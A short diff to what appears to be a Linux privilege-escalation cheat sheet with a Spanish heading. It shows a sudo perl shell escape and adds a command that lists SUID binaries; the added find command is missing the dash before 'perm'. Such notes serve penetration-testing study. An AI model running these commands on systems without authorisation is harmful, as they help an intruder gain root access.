@@ -41,6 +41,10 @@ echo “Reverse shell” > /dir/file
 ```vim
 sudo perl -e 'exec "/bin/sh";
 ```
+#### Binaries
+```vim
+find / perm -u=s -type f 2>/dev/null
+```
 ## Windows
 
 ## Link Interesantes
